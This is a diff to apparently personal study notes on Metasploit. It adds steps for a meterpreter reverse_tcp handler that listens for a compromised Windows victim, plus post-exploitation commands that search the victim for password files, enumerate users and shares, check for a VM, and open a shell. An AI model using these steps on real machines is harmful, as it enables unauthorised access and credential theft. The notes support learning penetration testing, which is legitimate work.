@@ -816,12 +816,13 @@ Things to take into account when desiging a payload
 Asuming that the payload is already downloaded in the victim machine either via social engineering or via exploitation of services or OS vulnerabilities and establishing a meterpreter session
 
 - `msfconsole`
+- `use exploit/multi/handler` executes a sequence of commands to target a specific vulnerability
 - `set payload windows/meterpreter/reverse_tcp` 
 - `show options`
 - `set LHOST <hacker's ip address>` this ip address must be the same as mentioned in the payload
 - `set LPORT 4444`
 - `show options`
-- `exploit` - This will start listening for the victim's machine which is told to connect to the hacker using reverse shell
+- `exploit` or `run` - This will start listening for the victim's machine which is told to connect to the hacker using reverse shell
 
 Once a connection is established, the the terminal will now say `meterpreter`
 
@@ -870,7 +871,7 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 
   - `download`: Downloads a file from the target.
 
-  - `search`: Searches for resources, similar to the `find` command in Linux. e-g `search -f *.jpg`
+  - `search`: Searches for resources, similar to the `find` command in Linux. e-g `search -f *.jpg`, `search -f password*`
 
   - `run win_privs`: Provides more detailed Windows privilege information.
 
@@ -880,8 +881,11 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 
 - `run post/windows/gather/`
 - `run post/windows/gather/enum_applications`
-- `run post/windows/gather/enum_logged_on_users`
+- `run post/windows/gather/enum_logged_on_users` lists logged in users
+- `run post/windows/gather/enum_shares` enumerates network shares
+- `run post/windows/gather/checkvm` checks if a victim is running inside a VM
 - `shell`
+- `net users`
 
 I asume that the above are run from hackers machine via the meterpreter session, but not so sure
 
